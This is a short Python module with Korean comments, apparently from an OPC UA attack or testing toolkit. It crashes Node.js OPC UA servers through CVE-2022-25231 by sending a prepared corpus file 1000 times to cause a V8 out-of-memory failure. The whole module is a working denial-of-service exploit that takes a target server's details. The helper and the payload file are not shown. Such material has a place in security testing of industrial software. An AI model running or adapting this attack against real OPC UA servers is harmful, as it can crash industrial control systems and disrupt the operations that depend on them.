# NodeJS OPCUA에서 corpus 샘플 파일로 크래시 유도하기 - V8 OOM (Out Of Memory)
#   NodeJS에서 OPCUA를 사용하는 환경에서 메모리 초과를 유발하는 공격.
#
# CVEs:
#   - CVE-2022-25231: https://security.snyk.io/vuln/SNYK-JS-NODEOPCUA-2988724
#   이 취약점은 NodeJS에서 OPC UA 스택을 사용할 때 발생하는 메모리 초과(Out Of Memory) 문제를 악용합니다.

import time
import os
CURRENT_PATH = os.path.dirname(os.path.abspath(__file__))

from .opcua_message_file import attack_file

# corpus 파일을 사용하여 서버를 공격하는 함수
#   이 공격은 샘플 corpus 파일을 사용하여 NodeJS OPC UA 서버에서 메모리 초과를 발생시키는 것을 목표로 합니다.
def attack(server_details):
    for i in range(1000):
        attack_file(
            server_details, 
            filepath_corpus=os.path.join(CURRENT_PATH, "examples/corpus_nodejs_opcua_crash_v8_oom.bin"), 
            num_requests=1
        )
